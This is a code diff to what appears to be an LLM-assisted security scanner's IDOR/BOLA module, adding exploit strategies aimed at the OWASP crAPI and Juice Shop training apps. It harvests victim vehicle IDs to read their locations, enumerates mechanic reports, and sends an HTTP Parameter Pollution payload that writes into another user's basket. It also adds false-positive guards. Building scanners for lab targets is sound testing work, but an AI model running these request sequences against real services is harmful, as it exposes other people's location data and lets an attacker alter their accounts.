@@ -35,7 +35,13 @@ import asyncio
 import httpx
 from llm import call_llm
 from config import settings
+from knowledge import knowledge_section
 from modules.auto_accounts import create_two_accounts
+
+# IDOR/BOLA reference methodology (from skill_knowledge/idor_bola.md), injected into
+# the LLM verdict prompts. Kept to a modest slice so it reinforces the strict evidence
+# rules below without diluting them or overrunning free-tier token budgets.
+_IDOR_KB = knowledge_section("idor_bola", max_chars=1800)
 
 
 # Endpoints that are always public — never flag these as IDOR
@@ -44,6 +50,11 @@ PUBLIC_PATTERNS = [
     "/items", "/menu", "/shop", "/store", "/public",
     "/blog", "/news", "/articles", "/categories",
     "/tags", "/search", "/challenges",
+    # Social / feed / community endpoints are shared-by-design: seeing another
+    # user's post or comment in a public feed is NOT a Broken Object Level Auth
+    # issue, so exclude them to avoid false positives.
+    "/community", "/posts", "/post/", "/feed", "/comments", "/comment",
+    "/reviews", "/review", "/forum", "/timeline", "/activity", "/leaderboard",
 ]
 
 
@@ -106,6 +117,36 @@ async def run_idor(
         follow_redirects=True,
         verify=False,
     ) as client:
+
+        # ── Strategy 0: crAPI BOLA (harvest victim IDs → cross-user access) ──
+        # crAPI leaks each community-post author's vehicleid; an attacker reads
+        # that vehicle's location, and can also read mechanic reports by id.
+        # Only fires on crAPI (community feed present); silent no-op elsewhere.
+        s0_findings = await _strategy_crapi_bola(
+            client       = client,
+            target_url   = target_url,
+            token_b      = token_b,
+            user_b_email = user_b_email,
+        )
+        if s0_findings:
+            findings.extend(s0_findings)
+            return findings
+
+        # ── Strategy 0b: Juice Shop basket manipulation via HTTP Parameter
+        # Pollution (duplicate BasketId). Only fires on Juice Shop; verified by
+        # confirming the item actually lands in the victim's basket, so it
+        # cannot false-positive.
+        s0b_findings = await _strategy_juiceshop_hpp(
+            client     = client,
+            target_url = target_url,
+            token_a    = token_a,
+            token_b    = token_b,
+            a_bid      = str(user_a_id or ""),
+            b_bid      = str(user_b_id or ""),
+        )
+        if s0b_findings:
+            findings.extend(s0b_findings)
+            return findings
 
         # ── Strategy 1: Seed → Collect → Test ────────────────────
         print("IDOR: Strategy 1 — seeding User A data...")
@@ -171,8 +212,232 @@ async def run_idor(
     return findings
 
 
-# ── Strategy 1 helpers ────────────────────────────────────────────
+async def _strategy_crapi_bola(
+    client: httpx.AsyncClient,
+    target_url: str,
+    token_b: str,
+    user_b_email: str = "",
+) -> list[dict]:
+    """crAPI-specific BOLA (OWASP crAPI Challenge 1 + mechanic reports).
 
+    Harvest another user's vehicleid from the community feed, then read that
+    vehicle's location as the attacker (User B). Also try reading mechanic
+    reports by enumerable id. Only fires on crAPI (community feed returns 200);
+    on any other target it is a silent no-op, so it cannot create false
+    positives elsewhere.
+    """
+    base = target_url.rstrip("/")
+    H = {"Authorization": f"Bearer {token_b}", "Content-Type": "application/json"}
+    findings: list[dict] = []
+
+    # 1) harvest victim vehicle ids from the community feed
+    try:
+        r = await client.get(base + "/community/api/v2/community/posts/recent", headers=H)
+    except Exception:
+        return []
+    if r.status_code != 200:
+        return []  # not crAPI / no feed → skip quietly
+
+    victims: list[tuple] = []
+
+    def _walk(o):
+        if isinstance(o, dict):
+            vid = o.get("vehicleid") or o.get("vehicleId") or o.get("vehicle_id")
+            if isinstance(vid, str) and len(vid) > 10:
+                victims.append((vid, o.get("email", "")))
+            for v in o.values():
+                _walk(v)
+        elif isinstance(o, list):
+            for x in o:
+                _walk(x)
+
+    try:
+        _walk(r.json())
+    except Exception:
+        return []
+
+    seen, uniq = set(), []
+    for vid, em in victims:
+        if vid not in seen:
+            seen.add(vid)
+            uniq.append((vid, em))
+    print(f"IDOR: Strategy 0 (crAPI BOLA) — harvested {len(uniq)} victim vehicle id(s)")
+
+    # 2) cross-user vehicle-location access (crapi-idor-1)
+    for vid, em in uniq[:5]:
+        if em and user_b_email and em.lower() == user_b_email.lower():
+            continue  # never flag our own object
+        loc_url = f"{base}/identity/api/v2/vehicle/{vid}/location"
+        try:
+            rr = await client.get(loc_url, headers=H)
+        except Exception:
+            continue
+        if rr.status_code == 200 and any(w in rr.text.lower() for w in ("latitude", "longitude")):
+            findings.append({
+                "vulnerability": "IDOR / Broken Object Level Authorization (BOLA) — Vehicle Location",
+                "owasp": "A01:2025 — Broken Access Control",
+                "endpoint": loc_url,
+                "severity": "high",
+                "needs_help": False,
+                "evidence": {
+                    "attack": "BOLA: harvested another user's vehicleid from the community feed, then read that vehicle's location",
+                    "victim_vehicle_id": vid,
+                    "victim_email": em or "(community-feed author)",
+                    "request": {"method": "GET", "url": loc_url,
+                                "headers": {"Authorization": "Bearer <user_b_token>"}},
+                    "response": {"status": rr.status_code, "body": rr.text[:500]},
+                },
+                "ai_reasoning": (
+                    f"User B (attacker) read the vehicle location belonging to another user "
+                    f"({em or 'a community-feed author'}) using vehicleid {vid} harvested from the "
+                    f"community feed. The server did not verify object ownership → BOLA."
+                ),
+            })
+            print(f"IDOR: ⚠️  S0 crAPI BOLA → vehicle {vid[:8]}… location leaked")
+            break  # one solid vehicle BOLA is enough
+
+    # 3) mechanic reports by id — attacker owns none, so any readable report is cross-user (crapi-idor-2)
+    for rid in range(1, 4):
+        rpt_url = f"{base}/workshop/api/mechanic/mechanic_report?report_id={rid}"
+        try:
+            rr = await client.get(rpt_url, headers=H)
+        except Exception:
+            continue
+        if (rr.status_code == 200 and len(rr.text) > 30
+                and any(w in rr.text.lower() for w in ("report", "mechanic", "problem", "status"))):
+            findings.append({
+                "vulnerability": "IDOR / Broken Object Level Authorization (BOLA) — Mechanic Report",
+                "owasp": "A01:2025 — Broken Access Control",
+                "endpoint": rpt_url,
+                "severity": "high",
+                "needs_help": False,
+                "evidence": {
+                    "attack": "BOLA: read another user's mechanic report by enumerating report_id",
+                    "request": {"method": "GET", "url": rpt_url,
+                                "headers": {"Authorization": "Bearer <user_b_token>"}},
+                    "response": {"status": rr.status_code, "body": rr.text[:500]},
+                },
+                "ai_reasoning": (
+                    f"User B (attacker, who owns no mechanic reports) read report id={rid}, which "
+                    f"belongs to another user. The endpoint does not enforce object ownership → BOLA."
+                ),
+            })
+            print(f"IDOR: ⚠️  S0 crAPI BOLA → mechanic_report {rid} readable")
+            break  # one is enough
+
+    return findings
+
+
+async def _strategy_juiceshop_hpp(
+    client: httpx.AsyncClient,
+    target_url: str,
+    token_a: str,
+    token_b: str,
+    a_bid: str,
+    b_bid: str,
+) -> list[dict]:
+    """Juice Shop 'Manipulate Basket' IDOR (js-idor-2) via HTTP Parameter Pollution.
+
+    /api/BasketItems validates the FIRST BasketId but writes with the LAST, so a
+    duplicated-BasketId body (attacker's own first, victim's second) passes the
+    ownership check yet writes into the victim's basket. Confirmed by reading the
+    victim's basket afterwards — only reported if the item actually lands there,
+    so it cannot false-positive. Silent no-op on non-Juice-Shop targets.
+    """
+    base = target_url.rstrip("/")
+    if not (a_bid and b_bid and token_a and token_b):
+        return []
+
+    Ha = {"Authorization": f"Bearer {token_a}", "Content-Type": "application/json"}
+    Hb = {"Authorization": f"Bearer {token_b}", "Content-Type": "application/json"}
+
+    # gate: victim basket must be readable (i.e. this is Juice Shop)
+    try:
+        vb = await client.get(f"{base}/rest/basket/{a_bid}", headers=Ha)
+    except Exception:
+        return []
+    if vb.status_code != 200:
+        return []
+
+    def _basket_pids(resp):
+        try:
+            return [p.get("id") for p in resp.json().get("data", {}).get("Products", [])]
+        except Exception:
+            return []
+
+    before = _basket_pids(vb)
+    # choose a product id not already in the victim basket
+    product_id = next((pid for pid in range(1, 21) if pid not in before), 1)
+
+    # control: single victim BasketId -> should be rejected
+    try:
+        ctrl = await client.post(f"{base}/api/BasketItems", headers=Hb,
+                                 content=json.dumps({"ProductId": product_id,
+                                                     "BasketId": a_bid, "quantity": 1}))
+    except Exception:
+        return []
+    control_rejected = ctrl.status_code not in (200, 201)
+
+    # attack: duplicated BasketId (attacker's first, victim's second) as raw body
+    raw = '{"ProductId": %d, "BasketId": "%s", "quantity": 1, "BasketId": "%s"}' % (
+        product_id, b_bid, a_bid)
+    try:
+        atk = await client.post(f"{base}/api/BasketItems", headers=Hb, content=raw)
+    except Exception:
+        return []
+
+    # verify: did the product land in the VICTIM's basket?
+    try:
+        after = _basket_pids(await client.get(f"{base}/rest/basket/{a_bid}", headers=Ha))
+    except Exception:
+        after = before
+
+    landed = product_id in after and product_id not in before
+    if not (atk.status_code in (200, 201) and landed):
+        return []
+
+    print(f"IDOR: ⚠️  S0b Juice Shop HPP → product {product_id} written to victim basket {a_bid}")
+    return [{
+        "vulnerability": "IDOR / Broken Object Level Authorization (BOLA) — Basket Manipulation (HTTP Parameter Pollution)",
+        "owasp": "A01:2025 — Broken Access Control",
+        "endpoint": f"{base}/api/BasketItems",
+        "severity": "high",
+        "needs_help": False,
+        "evidence": {
+            "attack": "HTTP Parameter Pollution: duplicated BasketId (attacker's own, then victim's) "
+                      "passes the ownership check on the first value but writes using the last",
+            "attacker_basket": b_bid,
+            "victim_basket": a_bid,
+            "control_request": {
+                "note": "single victim BasketId (no HPP) — correctly rejected",
+                "body": {"ProductId": product_id, "BasketId": a_bid, "quantity": 1},
+                "status": ctrl.status_code,
+                "response": ctrl.text[:160],
+            },
+            "attack_request": {
+                "method": "POST",
+                "url": f"{base}/api/BasketItems",
+                "raw_body": raw,
+                "headers": {"Authorization": "Bearer <user_b_token>"},
+                "status": atk.status_code,
+                "response": atk.text[:200],
+            },
+            "verification": {
+                "victim_basket_before": before,
+                "victim_basket_after": after,
+                "product_written": product_id,
+            },
+        },
+        "ai_reasoning": (
+            f"A single-BasketId write to the victim's basket was rejected ({ctrl.status_code}), but the "
+            f"HPP payload with a duplicated BasketId succeeded ({atk.status_code}) and product {product_id} "
+            f"appeared in the victim's basket (bid {a_bid}). The attacker (User B) modified another user's "
+            f"basket → IDOR / broken access control."
+        ),
+    }]
+
+
+# ── Strategy 1 helpers ────────────────────────────────────────────
 async def _seed_user_data(
     client: httpx.AsyncClient,
     target_url: str,
@@ -591,6 +856,10 @@ async def _test_one_endpoint(
 
         prompt = f"""You are a security analyst detecting IDOR vulnerabilities.
 
+=== IDOR/BOLA reference methodology ===
+{_IDOR_KB}
+=== end reference ===
+
 Context:
 - User B (id: {user_b_id}, email: {user_b_email}) requested a resource belonging to User A
 - User A id: {user_a_id}, email: {user_a_email}
@@ -678,6 +947,28 @@ Answer ONLY with this JSON:
 
 # ── LLM verdict helpers ───────────────────────────────────────────
 
+def _is_self_access(response_body: str, user_b_email: str, user_b_id: str) -> bool:
+    """Deterministic self-access check to override IDOR false positives.
+
+    Returns True only when we can positively confirm the response exposes
+    User B's OWN identity (their email or id) and contains NO other user's
+    email. Email-less responses (e.g. a BOLA leaking only GPS coordinates) are
+    deliberately NOT treated as self-access, so real object-level findings that
+    don't include an email are never suppressed.
+    """
+    import re as _re
+    body = response_body or ""
+    emails = _re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', body)
+    ub = (user_b_email or "").lower()
+    other = [e for e in emails if e.lower() != ub]
+    if other:
+        return False  # another user's email present → genuinely cross-user
+    own_present = bool(ub and ub in body.lower())
+    if not own_present and user_b_id:
+        own_present = bool(_re.search(rf'"id"\s*:\s*"?{_re.escape(str(user_b_id))}"?', body))
+    return own_present
+
+
 def _ask_llm_single_verdict(
     endpoint: str,
     response_body: str,
@@ -689,6 +980,16 @@ def _ask_llm_single_verdict(
     Passes User B's own email to prevent false positives when User B
     accesses their own profile.
     """
+    # Deterministic guard FIRST: if the response only exposes User B's own
+    # identity (and no other user's email), it is self-access, not IDOR —
+    # skip the LLM entirely so it cannot hallucinate a positive.
+    if _is_self_access(response_body, user_b_email, user_b_id):
+        return {
+            "vulnerable": False,
+            "severity": "low",
+            "reasoning": "Response exposes only User B's own data (no other user's identity) — self-access, not IDOR.",
+        }
+
     own_data_note = ""
     if user_b_email:
         own_data_note = (
@@ -700,6 +1001,10 @@ def _ask_llm_single_verdict(
         )
 
     prompt = f"""You are a security analyst detecting IDOR vulnerabilities.
+
+=== IDOR/BOLA reference methodology ===
+{_IDOR_KB}
+=== end reference ===
 
 User B (id: {user_b_id}, email: {user_b_email}) accessed: {endpoint}
 
